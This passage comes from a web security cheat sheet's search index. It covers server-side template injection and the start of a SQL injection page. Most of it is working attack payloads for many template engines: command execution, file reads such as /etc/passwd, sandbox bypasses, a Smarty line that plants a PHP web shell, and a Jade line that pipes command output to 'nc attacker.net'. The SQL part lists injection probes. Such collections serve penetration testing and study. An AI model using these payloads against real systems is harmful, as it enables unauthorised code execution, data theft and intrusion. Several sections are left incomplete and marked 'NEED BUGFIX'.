Exploiting SSRF in AWS Elastic Beanstalk - February 1, 2019 - @notsosecure PortSwigger - Web Security Academy Server-side request forgery (SSRF) SVG SSRF Cheatsheet - Allan Wirth (@allanlw) - 12/06/2019 SSRF’s up! Real World Server-Side Request Forgery (SSRF) - shorebreaksecurity - 2019 challenge 1: COME OUT, COME OUT, WHEREVER YOU ARE! Attacking Url\u0026rsquo;s in JAVA SSRF: Don\u0026rsquo;t encode entire IP "},{"id":65,"href":"/docs/server_side_template_injection/","title":"Server-Side Template Injection","section":"Docs","content":" Server-Side Template Injections # Note that Hugo still has some difficulty handling certain strings in certain manners here and it\u0026rsquo;s under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware # Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages\nTools # Recommended tools:\nTplmap - Server-Side Template Injection and Code Injection Detection and Exploitation Tool\ne.g:\npython2.7 ./tplmap.py -u \u0026#39;http://www.target.com/page?name=John*\u0026#39; --os-shell python2.7 ./tplmap.py -u \u0026#34;http://192.168.56.101:3000/ti?user=*\u0026amp;comment=supercomment\u0026amp;link\u0026#34; python2.7 ./tplmap.py -u \u0026#34;http://192.168.56.101:3000/ti?user=InjectHere*\u0026amp;comment=A\u0026amp;link\u0026#34; --level 5 -e jade SSTImap - Automatic SSTI detection tool with interactive interface based on Tplmap\ne.g:\npython3 ./sstimap.py -u \u0026#39;https://example.com/page?name=John\u0026#39; -s python3 ./sstimap.py -u \u0026#39;https://example.com/page?name=Vulnerable*\u0026amp;message=My_message\u0026#39; -l 5 -e jade python3 ./sstimap.py -i -A -m POST -l 5 -H \u0026#39;Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk\u0026#39; Methodology # Detection # In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :\nNEED BUGFIX FOR THIS POLYGLOT # ASP.NET Razor # Official website\nRazor is a markup syntax that lets you embed server-based code (Visual Basic and C#) into web pages.\nASP.NET Razor - Basic injection # @(1+2) ASP.NET Razor - Command execution # @{ // C# code } Expression Language EL # Official website\nExpression Language (EL) is mechanism that simplifies the accessibility of the data stored in Java bean component and other object like request, session and application, etc. There are many operators in JSP that are used in EL like arithmetic and logical operators to perform an expression. It was introduced in JSP 2.0\nExpression Language EL - Basic injection # ${1+1} #{1+1} Expression Language EL - One-Liner injections not including code execution # // DNS Lookup ${\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.net.InetAddress\u0026#34;).getMethod(\u0026#34;getByName\u0026#34;,\u0026#34;\u0026#34;.getClass()).invoke(\u0026#34;\u0026#34;,\u0026#34;xxxxxxxxxxxxxx.burpcollaborator.net\u0026#34;)} // JVM System Property Lookup (ex: java.class.path) ${\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.System\u0026#34;).getDeclaredMethod(\u0026#34;getProperty\u0026#34;,\u0026#34;\u0026#34;.getClass()).invoke(\u0026#34;\u0026#34;,\u0026#34;java.class.path\u0026#34;)} Expression Language EL - Code Execution # // Common RCE payloads \u0026#39;\u0026#39;.class.forName(\u0026#39;java.lang.Runtime\u0026#39;).getMethod(\u0026#39;getRuntime\u0026#39;,null).invoke(null,null).exec(\u0026lt;COMMAND STRING/ARRAY\u0026gt;) \u0026#39;\u0026#39;.class.forName(\u0026#39;java.lang.ProcessBuilder\u0026#39;).getDeclaredConstructors()[1].newInstance(\u0026lt;COMMAND ARRAY/LIST\u0026gt;).start() // Method using Runtime #{session.setAttribute(\u0026#34;rtc\u0026#34;,\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getDeclaredConstructors()[0])} #{session.getAttribute(\u0026#34;rtc\u0026#34;).setAccessible(true)} #{session.getAttribute(\u0026#34;rtc\u0026#34;).getRuntime().exec(\u0026#34;/bin/bash -c whoami\u0026#34;)} // Method using process builder ${request.setAttribute(\u0026#34;c\u0026#34;,\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.util.ArrayList\u0026#34;).newInstance())} ${request.getAttribute(\u0026#34;c\u0026#34;).add(\u0026#34;cmd.exe\u0026#34;)} ${request.getAttribute(\u0026#34;c\u0026#34;).add(\u0026#34;/k\u0026#34;)} ${request.getAttribute(\u0026#34;c\u0026#34;).add(\u0026#34;ping x.x.x.x\u0026#34;)} ${request.setAttribute(\u0026#34;a\u0026#34;,\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;).getDeclaredConstructors()[0].newInstance(request.getAttribute(\u0026#34;c\u0026#34;)).start())} ${request.getAttribute(\u0026#34;a\u0026#34;)} // Method using Reflection \u0026amp; Invoke ${\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethods()[6].invoke(\u0026#34;\u0026#34;.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;)).exec(\u0026#34;calc.exe\u0026#34;)} // Method using ScriptEngineManager one-liner ${request.getClass().forName(\u0026#34;javax.script.ScriptEngineManager\u0026#34;).newInstance().getEngineByName(\u0026#34;js\u0026#34;).eval(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\\\\\u0026#34;ping x.x.x.x\\\\\\\u0026#34;)\u0026#34;))} // Method using ScriptEngineManager ${facesContext.getExternalContext().setResponseHeader(\u0026#34;output\u0026#34;,\u0026#34;\u0026#34;.getClass().forName(\u0026#34;javax.script.ScriptEngineManager\u0026#34;).newInstance().getEngineByName(\u0026#34;JavaScript\u0026#34;).eval(\\\u0026#34;var x=new java.lang.ProcessBuilder;x.command(\\\\\\\u0026#34;wget\\\\\\\u0026#34;,\\\\\\\u0026#34;http://x.x.x.x/1.sh\\\\\\\u0026#34;);org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\\\u0026#34;))} Freemarker # Official website\nApache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.\nYou can try your payloads at https://try.freemarker.apache.org\nFreemarker - Basic injection # The template can be ${3*3} or the legacy #{3*3}.\nFreemarker - Read File # ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(\u0026#39;path_to_the_file\u0026#39;).toURL().openStream().readAllBytes()?join(\u0026#34; \u0026#34;)} Convert the returned bytes to ASCII Freemarker - Code execution # \u0026lt;#assign ex = \u0026#34;freemarker.template.utility.Execute\u0026#34;?new()\u0026gt;${ ex(\u0026#34;id\u0026#34;)} [#assign ex = \u0026#39;freemarker.template.utility.Execute\u0026#39;?new()]${ ex(\u0026#39;id\u0026#39;)} ${\u0026#34;freemarker.template.utility.Execute\u0026#34;?new()(\u0026#34;id\u0026#34;)} Freemarker - Sandbox bypass # :warning: only works on Freemarker versions below 2.3.30\n\u0026lt;#assign classloader=article.class.protectionDomain.classLoader\u0026gt; \u0026lt;#assign owc=classloader.loadClass(\u0026#34;freemarker.template.ObjectWrapper\u0026#34;)\u0026gt; \u0026lt;#assign dwf=owc.getField(\u0026#34;DEFAULT_WRAPPER\u0026#34;).get(null)\u0026gt; \u0026lt;#assign ec=classloader.loadClass(\u0026#34;freemarker.template.utility.Execute\u0026#34;)\u0026gt; ${dwf.newInstance(ec,null)(\u0026#34;id\u0026#34;)} Groovy # Official website\nGroovy - Basic injection # Refer to https://groovy-lang.org/syntax.html , but ${9*9} is the basic injection.\nGroovy - Read and create File # ${String x = new File(\u0026#39;c:/windows/notepad.exe\u0026#39;).text} ${String x = new File(\u0026#39;/path/to/file\u0026#39;).getText(\u0026#39;UTF-8\u0026#39;)} ${new File(\u0026#34;C:\\Temp\\FileName.txt\u0026#34;).createNewFile();} Groovy - HTTP request: # ${\u0026#34;http://www.google.com\u0026#34;.toURL().text} ${new URL(\u0026#34;http://www.google.com\u0026#34;).getText()} Groovy - Command Execution # ${\u0026#34;calc.exe\u0026#34;.exec()} ${\u0026#34;calc.exe\u0026#34;.execute()} ${this.evaluate(\u0026#34;9*9\u0026#34;) //(this is a Script class)} ${new org.codehaus.groovy.runtime.MethodClosure(\u0026#34;calc.exe\u0026#34;,\u0026#34;execute\u0026#34;).call()} Groovy - Sandbox Bypass # ${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\u0026#34;whoami\u0026#34;)}) def x } or\n${ new groovy.lang.GroovyClassLoader().parseClass(\u0026#34;@groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc.exe\\\u0026#34;)})def x\u0026#34;) } Handlebars # Official website\nHandlebars compiles templates into JavaScript functions.\nNEED BUGFIX FOR HANDLEBARS # Jade / Codepen # Official website\n- var x = root.process - x = x.mainModule.require - x = x(\u0026#39;child_process\u0026#39;) = x.exec(\u0026#39;id | nc attacker.net 80\u0026#39;) #{root.process.mainModule.require(\u0026#39;child_process\u0026#39;).spawnSync(\u0026#39;cat\u0026#39;, [\u0026#39;/etc/passwd\u0026#39;]).stdout} Java # Java - Basic injection # Multiple variable expressions can be used, if ${...} doesn\u0026rsquo;t work try #{...}, *{...}, @{...} or ~{...}.\n${7*7} ${class.getClassLoader()} ${class.getResource(\u0026#34;\u0026#34;).getPath()} ${class.getResource(\u0026#34;../../../../../index.htm\u0026#34;).getContent()} NEED BUGFIX FOR SOME JAVA # Java - Retrieve the system’s environment variables # ${T(java.lang.System).getenv()} Java - Retrieve /etc/passwd # ${T(java.lang.Runtime).getRuntime().exec(\u0026#39;cat etc/passwd\u0026#39;)} ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} Django Templates # Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.\nNEED BUGFIX FOR DJANGO # Jinja2 # Official website\nJinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.\nNEED BUGFIX FOR JINJA2 # Jinjava # Official website\nJava-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).\nNEED BUGFIX FOR JINJAVA # Lessjs # Official website\nLess (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.\nLessjs - SSRF / LFI # @import (inline) \u0026#34;http://localhost\u0026#34;; // or @import (inline) \u0026#34;/etc/passwd\u0026#34;; Lessjs \u0026lt; v3 - Command Execution # body { color: `global.process.mainModule.require(\u0026#34;child_process\u0026#34;).execSync(\u0026#34;id\u0026#34;)`; } Plugins # Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.\n// example local plugin usage @plugin \u0026#34;plugin-2.7.js\u0026#34;; or\n// example remote plugin usage @plugin \u0026#34;http://example.com/plugin-2.7.js\u0026#34; version 2 example RCE plugin:\nfunctions.add(\u0026#39;cmd\u0026#39;, function(val) { return `\u0026#34;${global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(val.value)}\u0026#34;`; }); version 3 and above example RCE plugin\n//Vulnerable plugin (3.13.1) registerPlugin({ install: function(less, pluginManager, functions) { functions.add(\u0026#39;cmd\u0026#39;, function(val) { return global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(val.value).toString(); }); } }) Mako # Official website\nMako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.\n\u0026lt;% import os x=os.popen(\u0026#39;id\u0026#39;).read() %\u0026gt; ${x} Direct access to os from TemplateNamespace: # Any of these payloads allows direct access to the os module\n${self.module.cache.util.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.util.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.cache.util.os.system(\u0026#34;id\u0026#34;)} ${self.module.cache.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.__init__.__globals__[\u0026#39;util\u0026#39;].os.system(\u0026#39;id\u0026#39;)} ${self.template.module.runtime.util.os.system(\u0026#34;id\u0026#34;)} ${self.module.filters.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.exceptions.util.os.system(\u0026#34;id\u0026#34;)} ${self.template.__init__.__globals__[\u0026#39;os\u0026#39;].system(\u0026#39;id\u0026#39;)} ${self.module.cache.util.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.util.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.template._mmarker.module.cache.util.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.cache.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.module.cache.compat.inspect.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.template._mmarker.module.runtime.util.os.system(\u0026#34;id\u0026#34;)} ${self.attr._NSAttr__parent.module.cache.util.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.filters.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.runtime.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.module.filters.compat.inspect.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.compat.inspect.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.runtime.exceptions.util.os.system(\u0026#34;id\u0026#34;)} ${self.attr._NSAttr__parent.module.runtime.util.os.system(\u0026#34;id\u0026#34;)} ${self.context._with_template.module.cache.util.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.exceptions.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.cache.util.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.context._with_template.module.runtime.util.os.system(\u0026#34;id\u0026#34;)} ${self.module.cache.util.compat.inspect.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.runtime.util.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.util.compat.inspect.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.exceptions.traceback.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.exceptions.util.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.template._mmarker.module.cache.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.cache.compat.inspect.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.attr._NSAttr__parent.template.module.cache.util.os.system(\u0026#34;id\u0026#34;)} ${self.template._mmarker.module.filters.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.template._mmarker.module.runtime.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.template._mmarker.module.runtime.exceptions.util.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.filters.compat.inspect.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.runtime.compat.inspect.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.attr._NSAttr__parent.template.module.runtime.util.os.system(\u0026#34;id\u0026#34;)} ${self.context._with_template._mmarker.module.cache.util.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.runtime.exceptions.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.context._with_template.module.cache.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.module.runtime.exceptions.compat.inspect.linecache.os.system(\u0026#34;id\u0026#34;)} ${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(\u0026#34;id\u0026#34;)} ${self.context._with_template._mmarker.module.runtime.util.os.system(\u0026#34;id\u0026#34;)} ${self.context._with_template.module.filters.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.context._with_template.module.runtime.compat.inspect.os.system(\u0026#34;id\u0026#34;)} ${self.context._with_template.module.runtime.exceptions.util.os.system(\u0026#34;id\u0026#34;)} ${self.template.module.runtime.exceptions.traceback.linecache.os.system(\u0026#34;id\u0026#34;)} PoC :\n\u0026gt;\u0026gt;\u0026gt; print(Template(\u0026#34;${self.module.cache.util.os}\u0026#34;).render()) \u0026lt;module \u0026#39;os\u0026#39; from \u0026#39;/usr/local/lib/python3.10/os.py\u0026#39;\u0026gt; Source @podalirius_ : https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/\nPebble # Official website\nPebble is a Java templating engine inspired by Twig and similar to the Python Jinja Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.\nNEED BUGFIX FOR PEBBLE # Ruby # Ruby - Basic injections # ERB:\n\u0026lt;%= 7 * 7 %\u0026gt; Slim:\n#{ 7 * 7 } Ruby - Retrieve /etc/passwd # \u0026lt;%= File.open(\u0026#39;/etc/passwd\u0026#39;).read %\u0026gt; Ruby - List files and directories # \u0026lt;%= Dir.entries(\u0026#39;/\u0026#39;) %\u0026gt; Ruby - Code execution # Execute code using SSTI for ERB engine.\n\u0026lt;%= system(\u0026#39;cat /etc/passwd\u0026#39;) %\u0026gt; \u0026lt;%= `ls /` %\u0026gt; \u0026lt;%= IO.popen(\u0026#39;ls /\u0026#39;).readlines() %\u0026gt; \u0026lt;% require \u0026#39;open3\u0026#39; %\u0026gt;\u0026lt;% @a,@b,@c,@d=Open3.popen3(\u0026#39;whoami\u0026#39;) %\u0026gt;\u0026lt;%= @b.readline()%\u0026gt; \u0026lt;% require \u0026#39;open4\u0026#39; %\u0026gt;\u0026lt;% @a,@b,@c,@d=Open4.popen4(\u0026#39;whoami\u0026#39;) %\u0026gt;\u0026lt;%= @c.readline()%\u0026gt; Execute code using SSTI for Slim engine.\n#{ %x|env| } Smarty # Official website\nSmarty is a template engine for PHP.\n{$smarty.version} {php}echo `id`;{/php} //deprecated in smarty v3 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\u0026#34;\u0026lt;?php passthru($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34;,self::clearConfig())} {system(\u0026#39;ls\u0026#39;)} // compatible v3 {system(\u0026#39;cat index.php\u0026#39;)} // compatible v3 Twig # Official website\nTwig is a modern template engine for PHP.\nTwig - Basic injection # NEED BUGFIX FOR TWIG # Twig - Template format # $output = $twig \u0026gt; render ( \u0026#39;Dear\u0026#39; . $_GET[\u0026#39;custom_greeting\u0026#39;], array(\u0026#34;first_name\u0026#34; =\u0026gt; $user.first_name) ); $output = $twig \u0026gt; render ( \u0026#34;Dear {first_name}\u0026#34;, array(\u0026#34;first_name\u0026#34; =\u0026gt; $user.first_name) ); Velocity # Official website\nVelocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.\n#set($str=$class.inspect(\u0026#34;java.lang.String\u0026#34;).type) #set($chr=$class.inspect(\u0026#34;java.lang.Character\u0026#34;).type) #set($ex=$class.inspect(\u0026#34;java.lang.Runtime\u0026#34;).type.getRuntime().exec(\u0026#34;whoami\u0026#34;)) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()]) $str.valueOf($chr.toChars($out.read())) #end patTemplate # patTemplate non-compiling PHP templating engine, that uses XML tags to divide a document into different parts\n\u0026lt;patTemplate:tmpl name=\u0026#34;page\u0026#34;\u0026gt; This is the main page. \u0026lt;patTemplate:tmpl name=\u0026#34;foo\u0026#34;\u0026gt; It contains another template. \u0026lt;/patTemplate:tmpl\u0026gt; \u0026lt;patTemplate:tmpl name=\u0026#34;hello\u0026#34;\u0026gt; Hello {NAME}.\u0026lt;br/\u0026gt; \u0026lt;/patTemplate:tmpl\u0026gt; \u0026lt;/patTemplate:tmpl\u0026gt; PHPlib and HTML_Template_PHPLIB # HTML_Template_PHPLIB is the same as PHPlib but ported to Pear.\nauthors.tpl\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;{PAGE_TITLE}\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;table\u0026gt; \u0026lt;caption\u0026gt;Authors\u0026lt;/caption\u0026gt; \u0026lt;thead\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Email\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;/thead\u0026gt; \u0026lt;tfoot\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;{NUM_AUTHORS}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;/tfoot\u0026gt; \u0026lt;tbody\u0026gt; \u0026lt;!-- BEGIN authorline --\u0026gt; \u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;{AUTHOR_NAME}\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;{AUTHOR_EMAIL}\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; \u0026lt;!-- END authorline --\u0026gt; \u0026lt;/tbody\u0026gt; \u0026lt;/table\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; authors.php\n\u0026lt;?php //we want to display this author list $authors = array( \u0026#39;Christian Weiske\u0026#39; =\u0026gt; \u0026#39;cweiske@php.net\u0026#39;, \u0026#39;Bjoern Schotte\u0026#39; =\u0026gt; \u0026#39;schotte@mayflower.de\u0026#39; ); require_once \u0026#39;HTML/Template/PHPLIB.php\u0026#39;; //create template object $t =\u0026amp; new HTML_Template_PHPLIB(dirname(__FILE__), \u0026#39;keep\u0026#39;); //load file $t-\u0026gt;setFile(\u0026#39;authors\u0026#39;, \u0026#39;authors.tpl\u0026#39;); //set block $t-\u0026gt;setBlock(\u0026#39;authors\u0026#39;, \u0026#39;authorline\u0026#39;, \u0026#39;authorline_ref\u0026#39;); //set some variables $t-\u0026gt;setVar(\u0026#39;NUM_AUTHORS\u0026#39;, count($authors)); $t-\u0026gt;setVar(\u0026#39;PAGE_TITLE\u0026#39;, \u0026#39;Code authors as of \u0026#39; . date(\u0026#39;Y-m-d\u0026#39;)); //display the authors foreach ($authors as $name =\u0026gt; $email) { $t-\u0026gt;setVar(\u0026#39;AUTHOR_NAME\u0026#39;, $name); $t-\u0026gt;setVar(\u0026#39;AUTHOR_EMAIL\u0026#39;, $email); $t-\u0026gt;parse(\u0026#39;authorline_ref\u0026#39;, \u0026#39;authorline\u0026#39;, true); } //finish and echo echo $t-\u0026gt;finish($t-\u0026gt;parse(\u0026#39;OUT\u0026#39;, \u0026#39;authors\u0026#39;)); ?\u0026gt; Plates # Plates is inspired by Twig but a native PHP template engine instead of a compiled template engine.\ncontroller:\n// Create new Plates instance $templates = new League\\Plates\\Engine(\u0026#39;/path/to/templates\u0026#39;); // Render a template echo $templates-\u0026gt;render(\u0026#39;profile\u0026#39;, [\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;Jonathan\u0026#39;]); page template:\n\u0026lt;?php $this-\u0026gt;layout(\u0026#39;template\u0026#39;, [\u0026#39;title\u0026#39; =\u0026gt; \u0026#39;User Profile\u0026#39;]) ?\u0026gt; \u0026lt;h1\u0026gt;User Profile\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Hello, \u0026lt;?=$this-\u0026gt;e($name)?\u0026gt;\u0026lt;/p\u0026gt; layout template:\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;\u0026lt;?=$this-\u0026gt;e($title)?\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?=$this-\u0026gt;section(\u0026#39;content\u0026#39;)?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; References # https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/ Yahoo! RCE via Spring Engine SSTI Ruby ERB Template injection - TrustedSec Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger) PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax VelocityServlet Expression Language injection Cheatsheet - Flask \u0026amp; Jinja2 SSTI - Sep 3, 2018 • By phosphore RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug RCE in Hubspot with EL injection in HubL - @fyoorer Jinja2 template injection filter bypasses - @gehaxelt, @0daywork Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018 EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018 Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019 Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020 Expression Language injection - PortSwigger Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019 Handlebars template injection and RCE in a Shopify app Lab: Server-side template injection in an unknown language with a documented exploit Exploiting Less.js to Achieve RCE A Pentester\u0026rsquo;s Guide to Server Side Template Injection (SSTI) Django Templates Server-Side Template Injection "},{"id":66,"href":"/docs/sql_injection/","title":"SQL Injection","section":"Docs","content":" SQL injection # A SQL injection attack consists of insertion or \u0026ldquo;injection\u0026rdquo; of a SQL query via the input data from the client to the application.\nAttempting to manipulate SQL queries may have goals including:\nInformation Leakage Disclosure of stored data Manipulation of stored data Bypassing authorization controls Entry point detection # Detection of an SQL injection entry point Simple characters\n\u0026#39; %27 \u0026#34; %22 # %23 ; %3B ) Wildcard (*) \u0026amp;apos; # required for XML content Multiple encoding\n%%2727 %25%27 Merging characters\n`+HERP \u0026#39;||\u0026#39;DERP \u0026#39;+\u0026#39;herp \u0026#39; \u0026#39;DERP \u0026#39;%20\u0026#39;HERP \u0026#39;%2B\u0026#39;HERP Logic Testing\npage.asp?id=1 or 1=1 -- true page.asp?id=1\u0026#39; or 1=1 -- true page.asp?id=1\u0026#34; or 1=1 -- true page.asp?id=1 and 1=2 -- false Weird characters\nUnicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was transformed into U+0022 QUOTATION MARK (\u0026#34;) Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was transformed into U+0027 APOSTROPHE (\u0026#39;) DBMS Identification # [\u0026#34;conv(\u0026#39;a\u0026#39;,16,2)=conv(\u0026#39;a\u0026#39;,16,2)\u0026#34; ,\u0026#34;MYSQL\u0026#34;], [\u0026#34;connection_id()=connection_id()\u0026#34; ,\u0026#34;MYSQL\u0026#34;], [\u0026#34;crc32(\u0026#39;MySQL\u0026#39;)=crc32(\u0026#39;MySQL\u0026#39;)\u0026#34; ,\u0026#34;MYSQL\u0026#34;], [\u0026#34;BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\u0026#34; ,\u0026#34;MSSQL\u0026#34;], [\u0026#34;@@CONNECTIONS\u0026gt;0\u0026#34; ,\u0026#34;MSSQL\u0026#34;], [\u0026#34;@@CONNECTIONS=@@CONNECTIONS\u0026#34; ,\u0026#34;MSSQL\u0026#34;], [\u0026#34;@@CPU_BUSY=@@CPU_BUSY\u0026#34; ,\u0026#34;MSSQL\u0026#34;], [\u0026#34;USER_ID(1)=USER_ID(1)\u0026#34; ,\u0026#34;MSSQL\u0026#34;], [\u0026#34;ROWNUM=ROWNUM\u0026#34; ,\u0026#34;ORACLE\u0026#34;], [\u0026#34;RAWTOHEX(\u0026#39;AB\u0026#39;)=RAWTOHEX(\u0026#39;AB\u0026#39;)\u0026#34; ,\u0026#34;ORACLE\u0026#34;], [\u0026#34;LNNVL(0=123)\u0026#34; ,\u0026#34;ORACLE\u0026#34;], [\u0026#34;5::int=5\u0026#34; ,\u0026#34;POSTGRESQL\u0026#34;], [\u0026#34;5::integer=5\u0026#34; ,\u0026#34;POSTGRESQL\u0026#34;], [\u0026#34;pg_client_encoding()=pg_client_encoding()\u0026#34; ,\u0026#34;POSTGRESQL\u0026#34;], [\u0026#34;get_current_ts_config()=get_current_ts_config()\u0026#34; ,\u0026#34;POSTGRESQL\u0026#34;], [\u0026#34;quote_literal(42.5)=quote_literal(42.5)\u0026#34; ,\u0026#34;POSTGRESQL\u0026#34;], [\u0026#34;current_database()=current_database()\u0026#34; ,\u0026#34;POSTGRESQL\u0026#34;], [\u0026#34;sqlite_version()=sqlite_version()\u0026#34; ,\u0026#34;SQLITE\u0026#34;], [\u0026#34;last_insert_rowid()\u0026gt;1\u0026#34; ,\u0026#34;SQLITE\u0026#34;], [\u0026#34;last_insert_rowid()=last_insert_rowid()\u0026#34; ,\u0026#34;SQLITE\u0026#34;], [\u0026#34;val(cvar(1))=1\u0026#34; ,\u0026#34;MSACCESS\u0026#34;], [\u0026#34;IIF(ATN(2)\u0026gt;0,1,0) BETWEEN 2 AND 0\u0026#34; ,\u0026#34;MSACCESS\u0026#34;], [\u0026#34;cdbl(1)=cdbl(1)\u0026#34; ,\u0026#34;MSACCESS\u0026#34;], [\u0026#34;1337=1337\u0026#34;, 